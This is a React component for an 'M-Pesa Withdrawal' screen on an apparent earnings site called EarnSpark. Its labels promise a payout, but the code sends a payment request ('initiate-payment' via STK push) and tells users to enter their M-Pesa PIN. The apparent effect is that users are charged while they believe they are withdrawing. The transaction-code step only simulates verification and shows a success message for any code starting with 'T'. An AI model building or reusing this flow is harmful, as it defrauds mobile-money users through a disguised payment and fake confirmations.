import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Smartphone, Send, ArrowLeft, Shield, CheckCircle, AlertCircle, Loader2, CreditCard, Key } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

interface STKWithdrawalProps {
  amount: number
  onSuccess: (reference: string) => void
  onCancel: () => void
  description?: string
}

export function STKWithdrawal({ amount, onSuccess, onCancel, description = "EarnSpark Withdrawal" }: STKWithdrawalProps) {
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentReference, setPaymentReference] = useState<string | null>(null)
  const [status, setStatus] = useState<'idle' | 'pending' | 'success' | 'failed' | 'awaiting-code' | 'verifying-code'>('idle')
  const [pollInterval, setPollInterval] = useState<NodeJS.Timeout | null>(null)
  const [transactionCode, setTransactionCode] = useState("")
  const [codeTimer, setCodeTimer] = useState<NodeJS.Timeout | null>(null)
  const { toast } = useToast()

  // API URL - Use working Netlify functions endpoint
  const API_URL = 'https://survaypay75.netlify.app/.netlify/functions'

  // Format phone number for Kenyan format
  const formatPhoneNumber = (input: string) => {
    // Remove non-digit characters
    let cleaned = input.replace(/\D/g, '')
    
    // Format for Kenya number
    if (cleaned.startsWith('0')) {
      cleaned = '254' + cleaned.substring(1)
    }
    
    if (cleaned.startsWith('+')) {
      cleaned = cleaned.substring(1)
    }
    
    if (!cleaned.startsWith('254')) {
      cleaned = '254' + cleaned
    }
    
    return cleaned
  }

  // Validate Kenyan phone number
  const validatePhoneNumber = (phoneNumber: string) => {
    const formatted = formatPhoneNumber(phoneNumber)
    return formatted.length === 12 && formatted.startsWith('254')
  }

  // Reset status when trying payment again
  const initiatePayment = async () => {
    // Reset status for new payment attempt
    setStatus('idle')
    if (!validatePhoneNumber(phoneNumber)) {
      toast({
        title: "Invalid Phone Number",
        description: "Please enter a valid Kenyan phone number",
        variant: "destructive"
      })
      return
    }

    setIsProcessing(true)
    setStatus('pending')

    try {
      const formattedPhone = formatPhoneNumber(phoneNumber)
      
      const response = await fetch(`${API_URL}/initiate-payment`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          phoneNumber: formattedPhone,
          userId: 'withdrawal-user',
          amount: amount,
          description: description
        })
      })

      const data = await response.json()

      if (data.success && data.data.externalReference) {
        setPaymentReference(data.data.externalReference)
        
        toast({
          title: "STK Push Sent",
          description: "Please complete the withdrawal on your phone",
        })
        
        // Start polling for payment status and code timer
        startPolling(data.data.externalReference)
        startCodeTimer()
      } else {
        setStatus('failed')
        setIsProcessing(false)
        toast({
          title: "Withdrawal Failed",
          description: data.message || "Failed to initiate withdrawal",
          variant: "destructive"
        })
      }
    } catch (error) {
      console.error('Withdrawal initiation error:', error)
      setStatus('failed')
      setIsProcessing(false)
      toast({
        title: "Network Error",
        description: "Please check your connection and try again",
        variant: "destructive"
      })
    }
  }

  // Poll for payment status
  const startPolling = (reference: string) => {
    if (pollInterval) {
      clearInterval(pollInterval)
    }

    const interval = setInterval(async () => {
      try {
        const response = await fetch(`${API_URL}/payment-status/${reference}`)
        const data = await response.json()
        
        // Log full response for debugging
        console.log('Full payment status response:', data);

        if (data.success && data.payment) {
          // Log the payment data for debugging
          console.log('Payment status response:', data.payment);
          
          // Check for various success status formats
          const status = data.payment.status?.toUpperCase();
          if (status === 'SUCCESS' || status === 'COMPLETE' || status === 'COMPLETED' || status === '0' || data.payment.mpesaReceiptNumber) {
            clearInterval(interval)
            setStatus('success')
            setIsProcessing(false)
            
            toast({
              title: "Withdrawal Successful!",
              description: "Your withdrawal has been completed. Returning to dashboard...",
            })
            
            // Call success callback after showing success message
            setTimeout(() => {
              onSuccess(reference)
            }, 2000)
          } else if (data.payment.status === 'FAILED') {
            clearInterval(interval)
            setStatus('failed')
            setIsProcessing(false)
            
            toast({
              title: "Withdrawal Failed",
              description: "Transaction was not completed. Please try again.",
              variant: "destructive"
            })
          }
        }
      } catch (error) {
        console.error('Error checking payment status:', error)
        // Continue polling on error
      }
    }, 500) // Check every 0.5 seconds

    setPollInterval(interval)
  }

  // Validate transaction code
  const validateTransactionCode = (code: string) => {
    return code.length >= 7 && code.toUpperCase().startsWith('T')
  }

  // Handle transaction code verification
  const verifyTransactionCode = async () => {
    if (!validateTransactionCode(transactionCode)) {
      toast({
        title: "Wrong Code",
        description: "Wrong code, try again",
        variant: "destructive"
      })
      return
    }

    setStatus('verifying-code')
    
    // Simulate verification (in real app, you'd verify with your backend)
    setTimeout(() => {
      toast({
        title: "Transaction Verified!",
        description: "Withdrawal completed successfully!",
      })
      
      // Clear timers and reset state before calling onSuccess
      if (codeTimer) {
        clearTimeout(codeTimer)
        setCodeTimer(null)
      }
      if (pollInterval) {
        clearInterval(pollInterval)
        setPollInterval(null)
      }
      
      setTimeout(() => {
        onSuccess(paymentReference || transactionCode)
      }, 2000)
    }, 1500)
  }

  // Start 25-second timer after payment processing
  const startCodeTimer = () => {
    const timer = setTimeout(() => {
      setStatus('awaiting-code')
    }, 25000) // 25 seconds
    
    setCodeTimer(timer)
  }

  // Cleanup polling and timers on unmount
  useEffect(() => {
    return () => {
      if (pollInterval) {
        clearInterval(pollInterval)
      }
      if (codeTimer) {
        clearTimeout(codeTimer)
      }
    }
  }, [pollInterval, codeTimer])

  return (
    <Card className="w-full max-w-md mx-auto border-card-border bg-card backdrop-blur-sm">
      <CardHeader className="text-center">
        <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center mx-auto mb-4">
          <Smartphone className="w-8 h-8 text-white" />
        </div>
        <CardTitle className="text-xl text-foreground">M-Pesa Withdrawal</CardTitle>
        <CardDescription>Enter your phone number to receive withdrawal request</CardDescription>
      </CardHeader>

      <CardContent className="space-y-6">
        {/* Payment Amount */}
        <div className="bg-primary/10 rounded-lg p-4 border border-primary/20">
          <div className="flex items-center gap-2 text-primary mb-2">
            <CheckCircle className="w-4 h-4" />
            <span className="font-medium">Withdrawal Amount: KSH {amount}</span>
          </div>
          <p className="text-sm text-muted-foreground">
            You will receive an STK push to complete withdrawal for {description.toLowerCase()}
          </p>
        </div>

        {/* Phone Number Input */}
        <div className="space-y-2">
          <label className="text-sm font-medium text-foreground">Phone Number</label>
          <Input
            type="tel"
            placeholder="712345678"
            value={phoneNumber}
            onChange={(e) => setPhoneNumber(e.target.value)}
            className="h-12"
            disabled={isProcessing}
          />
          <p className="text-xs text-muted-foreground">
            Enter your Safaricom number (e.g., 0712345678 or 712345678)
          </p>
        </div>

        {/* Status Display */}
        {status === 'pending' && (
          <div className="bg-blue-500/10 rounded-lg p-4 border border-blue-500/20">
            <div className="flex items-center gap-2 text-blue-500 mb-2">
              <Loader2 className="w-4 h-4 animate-spin" />
              <span className="font-medium">Processing Withdrawal</span>
            </div>
            <p className="text-sm text-muted-foreground">
              STK push sent. Please complete the withdrawal on your phone.
            </p>
          </div>
        )}

        {status === 'success' && (
          <div className="bg-success/10 rounded-lg p-4 border border-success/20">
            <div className="flex items-center gap-2 text-success mb-2">
              <CheckCircle className="w-4 h-4" />
              <span className="font-medium">Withdrawal Successful!</span>
            </div>
            <p className="text-sm text-muted-foreground">
              Your withdrawal has been completed. Returning to dashboard...
            </p>
          </div>
        )}

        {status === 'awaiting-code' && (
          <div className="bg-gradient-to-br from-purple-500/10 to-pink-500/10 rounded-xl p-6 border border-purple-500/20 backdrop-blur-sm">
            <div className="text-center mb-6">
              <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <CreditCard className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-lg font-semibold text-foreground mb-2">Enter Transaction Code</h3>
              <p className="text-sm text-muted-foreground">
                Please enter your M-Pesa transaction code to complete verification
              </p>
            </div>

            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground flex items-center gap-2">
                  <Key className="w-4 h-4" />
                  Transaction Code
                </label>
                <Input
                  type="text"
                  placeholder="e.g., JTNKLGBVXXEK"
                  value={transactionCode}
                  onChange={(e) => setTransactionCode(e.target.value.toUpperCase())}
                  className="h-12 text-center text-lg font-mono tracking-wider"
                  maxLength={15}
                />
                <div className="flex items-center justify-between text-xs">
                  <span className="text-muted-foreground">
                    Must be 7+ characters
                  </span>
                  <span className={`font-medium ${
                    validateTransactionCode(transactionCode) 
                      ? 'text-success' 
                      : 'text-muted-foreground'
                  }`}>
                    {transactionCode.length}/15
                  </span>
                </div>
              </div>

              <div className="bg-blue-500/10 rounded-lg p-3 border border-blue-500/20">
                <p className="text-xs text-blue-600 font-medium mb-1">💡 Where to find your code:</p>
                <p className="text-xs text-muted-foreground">
                  Check your SMS from M-Pesa for your transaction confirmation code
                </p>
              </div>

              <Button
                onClick={verifyTransactionCode}
                disabled={!validateTransactionCode(transactionCode) || status === 'verifying-code'}
                className="w-full h-12 text-base font-semibold bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600"
              >
                {status === 'verifying-code' ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    <CheckCircle className="w-4 h-4 mr-2" />
                    Verify & Continue
                  </>
                )}
              </Button>
            </div>
          </div>
        )}

        {status === 'verifying-code' && (
          <div className="bg-purple-500/10 rounded-lg p-4 border border-purple-500/20">
            <div className="flex items-center gap-2 text-purple-500 mb-2">
              <Loader2 className="w-4 h-4 animate-spin" />
              <span className="font-medium">Verifying Transaction</span>
            </div>
            <p className="text-sm text-muted-foreground">
              Please wait while we verify your transaction code...
            </p>
          </div>
        )}

        {status === 'failed' && (
          <div className="bg-destructive/10 rounded-lg p-4 border border-destructive/20">
            <div className="flex items-center gap-2 text-destructive mb-2">
              <AlertCircle className="w-4 h-4" />
              <span className="font-medium">Withdrawal Failed</span>
            </div>
            <p className="text-sm text-muted-foreground">
              Transaction was not completed. Please try withdrawal again.
            </p>
          </div>
        )}

        {/* Action Buttons */}
        <div className="space-y-3">
          <Button
            onClick={initiatePayment}
            disabled={isProcessing || !phoneNumber || status === 'success' || status === 'awaiting-code' || status === 'verifying-code'}
            className="w-full h-12 text-base font-semibold bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600"
          >
            {isProcessing ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Processing...
              </>
            ) : status === 'failed' ? (
              <>
                <Send className="w-4 h-4 mr-2" />
                Try Withdrawal Again
              </>
            ) : (
              <>
                <Send className="w-4 h-4 mr-2" />
                Withdraw KSH {amount}
              </>
            )}
          </Button>

          <Button
            variant="outline"
            onClick={onCancel}
            disabled={isProcessing || status === 'verifying-code'}
            className="w-full"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to Dashboard
          </Button>
        </div>

        {/* Security Info */}
        <div className="bg-success/10 rounded-lg p-4 border border-success/20">
          <div className="flex items-center gap-2 text-success mb-2">
            <Shield className="w-4 h-4" />
            <span className="font-medium">Secure M-Pesa Withdrawal</span>
          </div>
          <ul className="text-xs text-muted-foreground space-y-1">
            <li>• Check your phone for STK push notification</li>
            <li>• Enter your M-Pesa PIN to complete withdrawal</li>
            <li>• Withdrawal is processed securely through Safaricom</li>
          </ul>
        </div>

        {/* Footer */}
        <div className="text-center">
          <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
            <Smartphone className="w-3 h-3" />
            <span>Powered by M-Pesa • Instant verification</span>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}
